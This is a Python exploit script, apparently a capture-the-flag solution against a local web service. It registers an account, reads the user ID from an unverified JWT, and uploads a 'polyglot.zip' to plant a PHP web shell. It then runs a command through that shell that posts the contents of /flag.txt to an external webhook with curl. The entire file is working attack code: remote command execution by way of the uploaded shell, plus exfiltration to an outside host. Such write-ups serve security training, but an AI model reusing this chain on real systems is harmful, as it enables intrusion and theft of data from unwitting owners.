import zipfile
import requests
import jwt
import urllib.parse

def create_user(url):
    data = {
        "username": "kou",
        "password": "1"
    }
    response=requests.post(url+"/gateway/user/", data=data)
    print(response.text)

def get_token(url):
    data = {
        "username": "kou",
        "password": "1"
    }
    response=requests.post(url+"/auth/token/", data=data)
    data=response.json()
    print(data.get("access"))
    return data.get("access")

def check_file(file):
    with zipfile.ZipFile(file,"r") as zf:
         namelist = zf.namelist()
    return namelist
def get_user_id(token):
    try:
         payload = jwt.decode(token, options={"verify_signature": False})
         user_id = payload.get("user_id") or payload.get("user_id".lower()) or payload.get("userId")
         print("user_id:", user_id)
         return user_id
    except jwt.DecodeError as e:
         print("Decode error:", e)
         exit()
         
def get_flag(url, jwt_token, webhook_url):
    user_id=get_user_id(jwt_token)
    payload=f'''curl -X POST {webhook_url} -d "output=$(cat /flag.txt)"'''
    payload=urllib.parse.quote(payload)
    response=requests.get(url+f"/gateway/health/?module=/storage/{user_id}/shell.php%3Fcmd={payload}")
    print(url+f"/gateway/health/?module=/storage/{user_id}/shell.php?cmd={payload}")
    print("Status:", response.status_code)
    print("Response:", response.text)

# ========================================  
base_url = "http://localhost:8001"
webhook="https://5xpl3d4g.requestrepo.com"
create_user(base_url)
jwt_token=get_token(base_url)
token = f"Bearer {jwt_token}"              

with open("polyglot.zip", "rb") as f:
    print(check_file(f))
    files = {"file": ("polyglot.zip", f, "application/zip")}
    f.seek(0)
    headers = {
	"Authorization": token,
    }

    response = requests.post(base_url+"/gateway/transport/", files=files, headers=headers)

print("Status:", response.status_code)
print("Response:", response.text)

get_flag(base_url, jwt_token, webhook)